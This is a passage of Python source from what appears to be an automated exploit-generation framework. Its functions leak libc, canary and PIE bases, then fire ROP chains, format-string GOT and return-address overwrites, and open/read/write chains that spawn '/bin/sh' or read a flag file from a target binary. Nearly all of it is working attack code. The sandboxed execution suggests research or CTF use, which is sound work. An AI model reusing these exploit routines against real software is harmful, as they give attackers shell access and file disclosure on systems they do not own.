                chain = bytearray(b"A" * offset) + tail_fn(base, pad)
                try:
                    p.stdin.write(bytes(chain))
                    p.stdin.flush()
                    time.sleep(0.3)
                    p.stdin.write(markers.command + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break                                        # wrong parity: crashed
                out = _read_until(p, time.time() + timeout, quiet=1.5)
                if markers.proves(out):
                    r = {"ok": True, "base": base, "pad": pad, "tail": tail_name,
                         "output": out[:400].decode("latin-1", "ignore")}
                    if system:
                        r["system"], r["binsh"] = base + system, base + binsh
                    return r
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                            # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                                # noqa: BLE001
                    pass
    return {"ok": False, "reason": "no shell confirmed (leak parsed but the pure-libc chain did not "
                                   "spawn a shell under either alignment)", "base": last}


# --- ret2libc past a STACK CANARY (leak it, write it back, then chain) ---------------------------
def orw_leak(exe, workdir, *, offset, pop_rdi, pop_rsi, pop_rdx, puts_plt, puts_got, ret_to,
             puts_off, open_off, read_off, write_off, scratch=None, scratch_off=None,
             flag_path=b"flag", flag_marker=b"", ret_gadget=None, leaker="puts", write_plt=None,
             base_argv=(), timeout: float = 8.0, mem_mb: int = 2048) -> dict:
    """Two-stage leak + open/read/write: stage 1 leaks libc (puts/write of a GOT slot) and returns to
    the loop; stage 2 runs an ORW ROP that reads `flag_path` and writes it to stdout. Used when a
    seccomp filter blocks execve so system("/bin/sh") can never confirm. Confirmation is the
    DISCLOSURE itself -- `flag_marker` (planted only in the file, never sent as input) appearing in
    the output proves the chain opened+read the file. Returns {ok, base, disclosed}."""
    import struct as _struct
    from . import rop
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    path_blob = (flag_path if isinstance(flag_path, (bytes, bytearray)) else flag_path.encode()) + b"\x00"

    for align in ([None, ret_gadget] if ret_gadget is not None else [None]):
        for _ in range(3):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                     preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                _read_until(p, time.time() + 0.5)
                if leaker == "write" and pop_rsi and pop_rdx and write_plt:
                    s1 = rop.build_leak_write(offset, pop_rdi=pop_rdi, pop_rsi=pop_rsi,
                                              pop_rdx=pop_rdx, got=puts_got, write_plt=write_plt,
                                              ret_to=ret_to)
                else:
                    s1 = rop.build_leak_puts(offset, pop_rdi=pop_rdi, got=puts_got,
                                             puts_plt=puts_plt, ret_to=ret_to)
                try:
                    p.stdin.write(s1); p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                burst = _read_until(p, time.time() + timeout / 2)
                raw = (burst[:8] if leaker == "write" else burst.split(b"\n", 1)[0][:6])
                if len(raw) < 6:
                    continue
                base = rop.resolve_libc_base(int.from_bytes(raw.ljust(8, b"\x00"), "little"), puts_off)
                if not base:
                    continue
                # stage 2: the ORW chain. libc fns relocated by the leaked base. The scratch holding
                # the path + the file content is taken in LIBC's own writable .bss (base+scratch_off)
                # -- it is large and PIE-safe, unlike a tiny / RELRO-protected binary .bss. A fixed
                # binary `scratch` is the fallback for an unusual no-PIE layout.
                eff_scratch = (base + scratch_off) if scratch_off is not None else scratch
                if eff_scratch is None:
                    continue
                s2 = rop.build_orw_rop(offset, pop_rdi=pop_rdi, pop_rsi=pop_rsi, pop_rdx=pop_rdx,
                                       open_fn=base + open_off, read_fn=base + read_off,
                                       write_fn=base + write_off, scratch=eff_scratch,
                                       path_len=len(path_blob) + 8, ret_gadget=align)
                try:
                    p.stdin.write(s2); p.stdin.flush()
                    time.sleep(0.2)
                    p.stdin.write(path_blob)              # consumed by the ORW's read(0, scratch, ..)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break
                out = _read_until(p, time.time() + timeout, quiet=1.2)
                if flag_marker and flag_marker in out:
                    return {"ok": True, "base": base, "align": align,
                            "disclosed": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                            # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                                # noqa: BLE001
                    pass
    return {"ok": False, "reason": "ORW chain did not disclose the flag", "base": None}


def format_got_shell(exe, workdir, *, got_slot, system_off, leak_got=None, leak_off=None,
                     base_argv=(), timeout: float = 8.0, mem_mb: int = 2048,
                     marker: bytes = b"LYKOS-FMT-9931") -> dict:
    """Auto format-string -> shell for a LOOPING printf(user) sink (no-PIE, writable GOT). In one
    process: (1) recover the format argument offset, (2) leak the libc address in `got_slot` with a
    DETERMINISTIC `%N$s` read (base = leaked - `sym_off`; no %p-dump classification, which a stack
    rarely satisfies), (3) %hhn-overwrite `got_slot` (the sink's own printf@GOT) with system, (4)
    send "/bin/sh" so the loop's next printf(buf) becomes system("/bin/sh"). Confirmed by a spawned
    shell EVALUATING the marker (not an echo). No analyst config and no win function -- the write
    target and value are both auto-derived. Only a LOOPING sink reaches it: a single-shot sink cannot
    both leak and write."""
    from . import attribution, fmt
    markers = attribution.make_code_markers()
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    # Leak a DIFFERENT GOT slot than the one we overwrite: a %s reads until a NUL, so the leaked
    # function's address must not start with 0x00 -- and a page-aligned-offset function (printf,
    # whose offset ends in 000) does exactly that. The caller picks a leak fn with a non-zero low
    # byte; default to the overwrite target only as a fallback.
    lg = leak_got if leak_got is not None else got_slot
    lo = leak_off if leak_off is not None else system_off

    for _ in range(3):
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=preexec)
        except Exception as e:                               # noqa: BLE001
            return {"ok": False, "reason": f"spawn failed: {e!r}"}
        try:
            _read_until(p, time.time() + 0.5)
            # 1) argument offset where the format buffer lands
            try:
                p.stdin.write(fmt.probe_payload(count=30)); p.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            arg_off = fmt.find_fmt_offset(_read_until(p, time.time() + timeout / 3))
            if not arg_off:
                continue
            # 2) leak the libc address in the leak GOT slot via a deterministic positional %s
            try:
                p.stdin.write(fmt.read_at_payload(arg_off, lg)); p.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            dump = _read_until(p, time.time() + timeout / 3)
            raw = dump[:6]                                # %s prints the deref'd string FIRST
            if len(raw) < 6:
                continue
            base = int.from_bytes(raw.ljust(8, b"\x00"), "little") - lo
            if base <= 0 or (base & 0xFFF):              # not page-aligned -> wrong leak, retry
                continue
            # 3) overwrite the sink's printf@GOT with system
            try:
                p.stdin.write(fmt.fmtstr_payload(arg_off, {got_slot: base + system_off}))
                p.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            _read_until(p, time.time() + timeout / 3)
            # 4) next printf(buf) == system(buf): hand it "/bin/sh", then drive the shell
            try:
                p.stdin.write(b"/bin/sh\x00"); p.stdin.flush()
                time.sleep(0.3)
                p.stdin.write(markers.command + b"\n"); p.stdin.flush()
            except (BrokenPipeError, OSError):
                continue
            out = _read_until(p, time.time() + timeout, quiet=1.5)
            if markers.proves(out):
                return {"ok": True, "base": base, "system": base + system_off, "arg_offset": arg_off,
                        "output": out[:400].decode("latin-1", "ignore")}
        finally:
            for s in (p.stdin, p.stdout):
                try:
                    if s is not None:
                        s.close()
                except Exception:                            # noqa: BLE001
                    pass
            _kill(p)
            try:
                p.wait(timeout=2)
            except Exception:                                # noqa: BLE001
                pass
    return {"ok": False, "reason": "format GOT->system did not spawn a shell", "base": None}


def discover_canary_offset(exe, workdir, *, canary_trigger=b"", base_argv=(), timeout: float = 8.0,
                           mem_mb: int = 2048, lo: int = 8, hi: int = 400):
    """Auto-recover the overflow distance to the STACK CANARY by binary-searching the payload length
    at which the target FIRST trips __stack_chk_fail. A canary target aborts the normal L2 IP-control
    probe, so the control offset cannot be measured that way; but overwriting the canary's low byte at
    offset C needs exactly K=C+1 bytes, and any K>=C+1 aborts while K<C+1 does not -- a clean monotone
    threshold. `canary_trigger` is sent first to consume the leak read (the same two-step protocol
    canary_ret2libc uses). Returns (canary_offset, ret_offset) -- ret is 16 bytes past the canary in
    the standard x86-64 frame ([buf][canary][saved rbp][return]) -- or None when the shape does not
    hold (the high end never aborts, i.e. not a plain saved-canary stack overflow on this channel)."""
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    trig = (canary_trigger if isinstance(canary_trigger, (bytes, bytearray))
            else (canary_trigger.encode("latin-1") if canary_trigger else b""))

    def _aborts(k):
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
        try:
            p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                 stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                 preexec_fn=preexec)
        except Exception:                                    # noqa: BLE001
            return None
        try:
            _read_until(p, time.time() + 0.4)                # banner
            if trig:
                try:
                    p.stdin.write(trig); p.stdin.flush()
                except (BrokenPipeError, OSError):
                    return None
                _read_until(p, time.time() + 0.4)            # drain the leak output
            try:
                p.stdin.write(b"A" * k); p.stdin.flush(); p.stdin.close()
            except (BrokenPipeError, OSError):
                pass
            out = _read_until(p, time.time() + timeout / 2)
            try:
                rc = p.wait(timeout=2)
            except Exception:                                # noqa: BLE001
                rc = None
            # glibc prints "*** stack smashing detected ***" and raises SIGABRT (6); bwrap reports
            # 128+6, a native run -6.
            return (b"stack smashing" in out) or (rc in (-6, 134))
        finally:
            _kill(p)
            try:
                p.wait(timeout=1)
            except Exception:                                # noqa: BLE001
                pass

    if not _aborts(hi):
        return None                                          # no canary abort even at the far end
    a, b = lo, hi
    if _aborts(a):                                           # even the low end aborts: search below it
        a = 1
    while a < b:                                             # smallest K that aborts
        mid = (a + b) // 2
        res = _aborts(mid)
        if res is None:
            return None
        if res:
            b = mid
        else:
            a = mid + 1
    canary_offset = max(0, a - 1)
    return canary_offset, canary_offset + 16


def canary_ret2libc(exe, workdir, *, offset, canary_offset, ret_offset, canary_trigger,
                    pop_rdi, puts_plt, puts_got, ret_to, puts_off, system_off, binsh_off,
                    ret_gadget=None, canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
                    loop_feed: bytes = None, base_argv=(), marker: bytes = b"LYKOS-CAN-9931",
                    timeout: float = 8.0, mem_mb: int = 2048) -> dict:
    """ret2libc on a stack-canary-protected no-PIE target. A canary is a per-process random word
    between the buffer and the saved return; overflowing past it trips __stack_chk_fail unless the
    canary is written back UNCHANGED, and its value is random so it has to be LEAKED at runtime.

    `canary_trigger` (a format string / an over-read request) discloses the canary in the SAME
    process; `rop.find_canary` picks it out (or `canary_index` names the leak slot). Every overflow
    then carries `build_canary_prefix` -- pad to the canary, the leaked canary, pad to the return --
    before the ROP. The rest is the two-stage puts leak: stage 1 leaks libc and returns to `ret_to`,
    stage 2 calls system("/bin/sh"). `loop_feed` is what the re-entered loop reads before the second
    overflow (default: the canary trigger again, harmless). Confirmed by a spawned shell.
    """
    import re as _re
    import struct as _struct

    from . import rop
    rx = _re.compile(canary_regex.encode("latin-1"))
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    feed = canary_trigger if loop_feed is None else loop_feed
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]

    def _canary(p):
        try:
            p.stdin.write(canary_trigger)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return None
        dump = _read_until(p, time.time() + timeout / 2)
        vals = [int(m.group(0), 16) for m in rx.finditer(dump)
                if _allint(m.group(0))]
        vals += _le_canary_words(dump)               # a raw over-read leaks the canary as binary
        if canary_index is not None and -len(vals) <= canary_index < len(vals):
            return vals[canary_index]
        return rop.find_canary(vals)

    for align in (None, ret_gadget):
        for _ in range(3):
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                _read_until(p, time.time() + 0.5)
                canary = _canary(p)
                if canary is None:
                    continue
                pre = rop.build_canary_prefix(canary_offset, canary, ret_offset)
                # stage 1: leak libc via puts (canary preserved), return to the loop
                s1 = pre + q(pop_rdi) + q(puts_got) + q(puts_plt) + q(ret_to)
                try:
                    p.stdin.write(s1)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                burst = _read_until(p, time.time() + timeout / 2)
                raw = burst.split(b"\n", 1)[0][:6]
                if len(raw) < 6:
                    continue
                base = rop.resolve_libc_base(int.from_bytes(raw.ljust(8, b"\x00"), "little"), puts_off)
                if not base:
                    continue
                # re-entered loop: satisfy the intermediate read, then stage 2 (system)
                try:
                    p.stdin.write(feed)
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                _read_until(p, time.time() + 0.4)
                s2 = bytearray(pre)
                if align:
                    s2 += q(align)
                s2 += q(pop_rdi) + q(base + binsh_off) + q(base + system_off)
                try:
                    p.stdin.write(bytes(s2))
                    p.stdin.flush()
                    time.sleep(0.3)
                    p.stdin.write(b"echo " + marker + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    break                                       # wrong parity
                out = _read_until(p, time.time() + timeout, quiet=1.5)
                if marker in out:
                    return {"ok": True, "canary": canary, "base": base,
                            "system": base + system_off, "align": align,
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                           # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                               # noqa: BLE001
                    pass
    return {"ok": False, "reason": "canary leaked but the ret2libc chain did not spawn a shell "
                                   "(offsets/leak slot?)"}


def _replay_over_read(p, sel, *, leak_recipe, canary_trigger, canary_index, canary_regex,
                      target_bytes, libc_data, timeout):
    """Drive a leak in ONE already-spawned process and recover (canary, pie_base, libc_base, pos).

    Either a SINGLE trigger (an ungated %p dump / over-read) or a RECIPE -- the multi-step input the
    interaction model found to reach a leak behind a typed prompt sequence. A recipe is replayed with
    the stall-based drain (menu._drain: read until the program blocks on the NEXT read) so the FULL
    over-read dump is captured; a quiet-based read truncates it and base corroboration then fails. The
    process is left OPEN, blocked on the read that follows the leak -- the overflow site.

    `pos` is the self-derived overflow distance from the printed fill run to the canary slot: a RAW
    over-read carries the full 8-byte canary word (its byte offset is the distance); a printf("%s")
    over-read TRUNCATES at the canary's NUL low byte, so the 7 non-NUL bytes follow the run and the
    run LENGTH is the distance. `libc_base` is recovered via classify_leak when libc_data is given
    (a deep RAW over-read can spill a libc return address alongside the image pointers)."""
    import re as _re
    import struct as _struct

    from . import exploit as _exploit
    from . import rop
    from ..fuzz import menu as _menu
    rx = _re.compile(canary_regex.encode("latin-1"))
    dump = b""
    try:
        if leak_recipe:
            for step in leak_recipe:                     # drain the prompt, then answer it
                o, _alive = _menu._drain(p, sel, idle=0.2, deadline=time.monotonic() + max(0.5, timeout / 3))
                dump += o.encode("latin1") if isinstance(o, str) else (o or b"")
                p.stdin.write(step if isinstance(step, (bytes, bytearray)) else bytes(step))
                p.stdin.flush()
            o, _a = _menu._drain(p, sel, idle=0.2, deadline=time.monotonic() + timeout)  # the leak output
            dump += o.encode("latin1") if isinstance(o, str) else (o or b"")
        else:
            p.stdin.write(canary_trigger)
            p.stdin.flush()
            dump += _read_until(p, time.time() + timeout / 2)
    except (BrokenPipeError, OSError):
        return None, None, None, None
    vals = [int(m.group(0), 16) for m in rx.finditer(dump) if _allint(m.group(0))]
    vals += _le_pointer_words(dump)
    cvals = list(vals) + _le_canary_words(dump)
    canary = (cvals[canary_index] if canary_index is not None
              and -len(cvals) <= canary_index < len(cvals) else rop.find_canary(cvals))
    pos = None
    if leak_recipe:
        fill = bytes(leak_recipe[-1]).rstrip(b"\n")
        m = _re.search(_re.escape(fill[:16]) + rb"+", dump) if fill else None
        if m:
            if canary is not None:                       # raw: locate the full canary word
                at = dump.find(_struct.pack("<Q", canary))
                if at >= m.start():
                    pos = at - m.start()
            tail = dump[m.end(): m.end() + 16]           # %s-truncated reconstruction
            if pos is None and len(tail) >= 7 and all(b != 0 for b in tail[:7]) and \
                    sum(1 for b in tail[:7] if 0x20 <= b < 0x7f) <= 2:
                canary = int.from_bytes(b"\x00" + tail[:7], "little")
                pos = m.end() - m.start()
            for i in range(len(tail) - 5):
                if tail[i + 5] in (0x7F, 0x55, 0x56):
                    vals.append(int.from_bytes(tail[i:i + 6], "little"))
    pie_base = _exploit.recover_pie_base(vals, target_bytes)
    libc_base = None
    if libc_data:
        try:
            libc_base = classify_leak(vals, target_bytes, libc_data).get("libc_base")
        except Exception:                                # noqa: BLE001
            libc_base = None
    return canary, pie_base, libc_base, pos


def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, ret_offset=None,
                       win_off, target_bytes, leak_recipe=None, canary_index=None,
                       canary_regex: str = r"0x[0-9a-fA-F]+", loop_feed: bytes = None, base_argv=(),
                       marker: bytes = b"LYKOS-PCW-9931", timeout: float = 8.0,
                       mem_mb: int = 2048) -> dict:
    """ret2win on a PIE + stack-canary target with an in-binary win (a function that spawns a shell
    / prints the flag). Both the canary AND the PIE base are random per process, so BOTH are leaked
    IN THE SAME PROCESS as the overflow: `canary_trigger` discloses them (a format `%p` dump or a
    `printf("%s", buf)` over-read that runs into the canary and the saved return into image code);
    `rop.find_canary` picks the canary and `exploit.recover_pie_base` pins the base from >=2
    corroborating image pointers. The overflow then writes the leaked canary back
    (`build_canary_prefix`) and returns to `win_off + pie_base`. Confirmed by a spawned shell
    echoing `marker` (a win that execve's a shell) OR the win's own output containing the marker.
    Returns {ok, canary, pie_base, win} or {ok: False, reason}."""
    import re as _re
    import struct as _struct

    from . import exploit as _exploit
    from . import rop
    rx = _re.compile(canary_regex.encode("latin-1"))
    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
    feed = canary_trigger if loop_feed is None else loop_feed
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]

    def _leak(p, sel):
        canary, pie_base, _libc, pos = _replay_over_read(
            p, sel, leak_recipe=leak_recipe, canary_trigger=canary_trigger,
            canary_index=canary_index, canary_regex=canary_regex, target_bytes=target_bytes,
            libc_data=b"", timeout=timeout)
        return canary, pie_base, pos

    # A PIE target with a relative loader must run with the sandbox cwd in its staged dir.
    rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
    # Residue sweep: a preceding numeric/line prompt leaves its delimiter in the pipe, and a fill
    # longer than a fixed-size read spills the excess -- bytes the OVERFLOW read then swallows BEFORE
    # our payload, shifting every frame field. We cannot drain the kernel pipe from the writer, and
    # the leak + overflow must share ONE process (both bases are per-process), so we re-leak per skew
    # and shift the canary/return offsets back by `skew` until the frame lands. skew=0 is the clean
    # (residue-free) case and is tried first.
    for skew in (0, 1, 2, 3, 4):
        for align in (False, True):                              # optional ret-slide for alignment
            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir],
                                         chdir=(exedir if rel else "")) + [str(exe)] + argv
            try:
                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, cwd=exedir,
                                     start_new_session=True, preexec_fn=preexec)
            except Exception as e:                               # noqa: BLE001
                return {"ok": False, "reason": f"spawn failed: {e!r}"}
            try:
                import selectors as _selectors
                sel = _selectors.DefaultSelector()
                sel.register(p.stdout, _selectors.EVENT_READ)
                if not leak_recipe:
                    _read_until(p, time.time() + 0.5)        # consume the opening banner (single-trigger)
                canary, pie_base, pos = _leak(p, sel)
                if canary is None or not pie_base:
                    continue                                     # need BOTH in this process
                # offsets: analyst/caller value wins; else self-derive from the over-read -- the
                # canary sits `pos` bytes into the overflow, the return another 16 past it (the
                # standard [buf][canary][saved rbp][return] frame).
                co = canary_offset if canary_offset is not None else pos
                ro = ret_offset if ret_offset is not None else ((pos + 16) if pos is not None else None)
                if co is None or ro is None:
                    continue
                co -= skew                                       # absorb pipe residue shift
                ro -= skew
                if co < 0 or ro < 0:
                    continue
                pre = rop.build_canary_prefix(co, canary, ro)
                payload = bytearray(pre)
                if align:                                        # a lone `ret` to fix 16-byte align
                    r = rop.find_gadget(target_bytes, "ret")
                    if r:
                        payload += q(pie_base + r)
                payload += q(pie_base + int(win_off))
                try:
                    p.stdin.write(bytes(payload))
                    p.stdin.flush()
                    # re-entered read (if the overflow returns through a loop) then provoke output
                    time.sleep(0.2)
                    p.stdin.write(b"echo " + marker + b"\n")
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                out = _read_until(p, time.time() + timeout, quiet=1.2)
                if marker in out or b"/bin/sh" in out or b"$ " in out:
                    return {"ok": True, "canary": canary, "pie_base": pie_base,
                            "win": pie_base + int(win_off),
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                           # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                               # noqa: BLE001
                    pass
    return {"ok": False, "reason": "PIE+canary ret2win: leaked the canary but could not corroborate "
                                   "a PIE base from the same leak, or the redirect did not confirm"}


def format_ret2win(exe, workdir, *, win_off, target_bytes, fmt_offset=None, read_cap=255,
                   gate_prefix: bytes = b"", loop_exit: bytes = b"q\n", base_argv=(),
                   marker: bytes = b"LYKOS-FMT-9931", timeout: float = 10.0,
                   mem_mb: int = 2048) -> dict:
    """Format-string -> ret2win on a PIE + Full-RELRO target (GOT read-only, so a %n must hit a
    SAVED RETURN on the stack, not a GOT slot). Needs a LOOPING printf(user) sink: iteration 1 does a
    `%N$p` leak, iteration 2 does the `%hhn` write, then the function returns through the overwritten
    slot. A targeted %n to the return does NOT cross the stack canary (no overflow), so this works on
    a canary-protected target too. In ONE process (ASLR forces same-process use):
      leak -- recover the PIE base from the image pointers the dump spills (recover_pie_base), and
              collect the stack-pointer values (frame pointers; a saved return sits at frame_ptr+8);
      write -- fmtstr_payload plants `pie_base + win_off` at a candidate (stack_ptr + delta).
    The exact frame-pointer->return delta is layout-specific, so SWEEP the leaked stack pointers x a
    few deltas and let a spawned-shell marker pick the slot that actually redirects (never guessed
    blindly). Confirmed by a shell echoing `marker`. Returns {ok, pie_base, win, target} or
    {ok: False, reason}. `gate_prefix` is any bytes that must precede the payload to reach the sink.

    The probe must FIT the sink's read size (`read_cap`): too long a `%p` dump spills past the read
    and desyncs the loop. A big input buffer also pushes the saved frame off the low slots, so the
    probe reads a DEEP slot window that starts past the buffer (fmt_offset + buffer-in-slots) where
    the image / frame / libc pointers actually sit. `fmt_offset` (where the payload lands in printf's
    varargs) is calibrated once in a throwaway process -- it is an ASLR-invariant layout constant."""
    import re as _re

    from . import exploit as _exploit
    from . import fmt as _fmt
    rel = sandbox._relative_interp(str(exe)) if hasattr(sandbox, "_relative_interp") else False
    exedir = str(Path(exe).resolve().parent)
    argv = [str(a) for a in base_argv]
    hexrx = _re.compile(rb"0x[0-9a-fA-F]+|\(nil\)")
    MARK = 0x4141414141414141

    def _spawn():
        preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
        cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir],
                                     chdir=(exedir if rel else "")) + [str(exe)] + argv
        return subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.STDOUT, cwd=exedir, start_new_session=True,
                                preexec_fn=preexec)

    def _dump(p, lo, hi):
        """Send one `%lo$p .. %hi$p` dump (sized under read_cap) and return {slot: value}."""
        body = gate_prefix + b" ".join(b"%%%d$p" % i for i in range(lo, hi + 1)) + b"\n"
        try:
            p.stdin.write(body)
            p.stdin.flush()
        except (BrokenPipeError, OSError):
            return {}
        out = _read_until(p, time.time() + timeout / 2)
        vals = {}
        for i, tk in enumerate(hexrx.findall(out), lo):
            if tk != b"(nil)":
                try:
                    vals[i] = int(tk, 16)
                except ValueError:
                    pass
        return vals

    # Calibrate fmt_offset once (throwaway process): marker + a short low dump -> the slot whose
    # printed value is the marker is where our buffer lands in printf's varargs.
    if not fmt_offset:
        q = _spawn()
        try:
            _read_until(q, time.time() + 0.5)
            try:
                q.stdin.write(gate_prefix + struct.pack("<Q", MARK) + b"|"
                              + b" ".join(b"%%%d$p" % i for i in range(1, 25)) + b"\n")
                q.stdin.flush()
            except (BrokenPipeError, OSError):
                pass
            fmt_offset = _fmt.find_fmt_offset(_read_until(q, time.time() + timeout / 2), marker=MARK)
        finally:
            _kill(q)
            try:
                q.wait(timeout=2)
            except Exception:                            # noqa: BLE001
                pass
    if not fmt_offset:
        return {"ok": False, "reason": "format-string ret2win: could not calibrate the varargs "
                                       "offset (no reachable printf(user) sink?)"}

    # Deep window: skip the buffer (fmt_offset + buffer-in-slots) and read as many slots as fit the
    # read, so the image / frame / libc pointers past the buffer are captured in ONE read.
    per = 8                                              # bytes per "%NNN$p " directive, ~roomy
    width = max(8, min(40, (read_cap - len(gate_prefix)) // per))
    deep_lo = int(fmt_offset) + (read_cap // 8) + 1

    deltas = (8, 0, 16, -8, 24, -16, 32, 40)
    for cand_idx in range(width):
        for delta in deltas:
            p = _spawn()
            try:
                _read_until(p, time.time() + 0.5)        # banner
                vals = _dump(p, deep_lo, deep_lo + width - 1)   # iteration 1: deep leak
                image = [v for v in vals.values() if 0x550000000000 <= v < 0x600000000000]
                pie_base = _exploit.recover_pie_base(image, target_bytes, allow_single=True)
                if not pie_base:
                    break                                # no image pointer in this window -> stop
                stacks = [v for s, v in sorted(vals.items())
                          if 0x7F0000000000 <= v < 0x800000000000]
                if cand_idx >= len(stacks):
                    break                                # exhausted the leaked stack pointers
                target = stacks[cand_idx] + delta
                win = pie_base + int(win_off)
                try:
                    payload = _fmt.fmtstr_payload(int(fmt_offset), {target: win})
                except ValueError:
                    continue
                if len(gate_prefix) + len(payload) + 1 > read_cap:
                    continue                             # write payload must fit the read too
                try:                                     # iteration 2: the %hhn write
                    p.stdin.write(gate_prefix + payload + b"\n")
                    p.stdin.flush()
                    time.sleep(0.2)
                    # A menu-gated sink LOOPS: after the write the function is back at its prompt, so
                    # the overwritten return has not fired yet. Nudge the loop to RETURN -- a
                    # non-numeric trips the usual `if (scanf(...) != 1) return;` exit -- so control
                    # passes through the overwritten slot. Harmless when the sink already returns.
                    if loop_exit:
                        p.stdin.write(loop_exit)
                        p.stdin.flush()
                        time.sleep(0.2)
                    p.stdin.write(b"echo " + marker + b"\n")   # a spawned shell evaluates this
                    p.stdin.flush()
                except (BrokenPipeError, OSError):
                    continue
                out = _read_until(p, time.time() + timeout, quiet=1.2)
                if marker in out or b"/bin/sh" in out or b"$ " in out:
                    return {"ok": True, "pie_base": pie_base, "win": win, "target": target,
                            "fmt_offset": int(fmt_offset),
                            "output": out[:400].decode("latin-1", "ignore")}
            finally:
                for s in (p.stdin, p.stdout):
                    try:
                        if s is not None:
                            s.close()
                    except Exception:                    # noqa: BLE001
                        pass
                _kill(p)
                try:
                    p.wait(timeout=2)
                except Exception:                        # noqa: BLE001
                    pass
    return {"ok": False, "reason": "format-string ret2win: leaked a PIE base but no (stack ptr, delta) "
                                   "redirected control to win (frame layout? sink not looping?)"}


def canary_pie_ret2libc(exe, workdir, *, target_bytes, libc_data, pop_rdi_off, system_off, binsh_off,
                        leak_recipe=None, canary_trigger=b"", canary_offset=None, ret_offset=None,
                        canary_index=None, canary_regex: str = r"0x[0-9a-fA-F]+",
                        puts_plt_off=None, puts_got_off=None, puts_libc_off=None, ret_to_off=None,
                        ret_gadget_off=None, base_argv=(), marker: bytes = b"LYKOS-PCL-9931",
                        timeout: float = 10.0, mem_mb: int = 2048) -> dict:
    """ret2libc on a PIE + stack-canary target with NO in-binary win -- the gated-leak counterpart of
    canary_pie_ret2win for the common hardened cluster where the only path to a shell is libc.

    The canary AND the PIE base are leaked IN ONE PROCESS by replaying the interaction recipe's
    over-read (_replay_over_read); every overflow carries build_canary_prefix so __stack_chk_fail
    passes. Two routes reach libc:

      one-shot  -- the SAME over-read already spilled a libc pointer (a deep RAW over-read that runs
                   into a __libc_start_* return address): classify_leak hands back libc_base, so a
                   single canary-bypass overflow returns straight to system("/bin/sh").
      two-stage -- no libc in the leak, but the vulnerable read RE-ENTERS (ret_to_off names the loop):
                   a canary-prefixed puts(puts@GOT) relocated by the PIE base prints a libc pointer,
                   the recipe's benign prefix is replayed to re-reach the read, and a second
                   canary-prefixed overflow calls system.

